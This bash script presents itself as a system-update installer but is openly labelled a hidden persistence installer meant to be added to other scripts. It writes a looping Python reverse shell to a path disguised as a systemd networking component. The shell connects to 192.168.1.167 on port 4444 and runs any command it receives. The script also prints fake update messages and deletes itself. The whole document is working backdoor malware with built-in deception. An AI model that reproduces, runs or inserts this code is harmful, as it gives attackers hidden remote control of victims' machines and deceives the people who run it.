#!/bin/bash
# Hidden persistence installer - can be added to any script

echo "[+] Installing system updates..."  # Fake message

# Create hidden payload as one-liner
mkdir -p /usr/lib/systemd/systemd-network 2>/dev/null
cat > /usr/lib/systemd/systemd-network/networkd << 'EOF'
#!/bin/bash
while true; do python3 -c "import socket,subprocess,os,time
while True:
 try:
  s=socket.socket()
  s.settimeout(30)
  s.connect(('192.168.1.167',4444))
  s.send(b'READY')
  while True:
   d=s.recv(1024).decode().strip()
   if not d:continue
   if d=='exit':break
   r=subprocess.run(d,shell=True,capture_output=True,text=True)
   o=r.stdout+r.stderr
   s.send(o.encode())
 except:time.sleep(30)" 2>/dev/null & sleep 60; done
EOF

chmod +x /usr/lib/systemd/systemd-network/networkd 2>/dev/null

# Start hidden
nohup /usr/lib/systemd/systemd-network/networkd >/dev/null 2>&1 &

echo "[+] Updates completed successfully"
rm -f "$0" 2>/dev/null
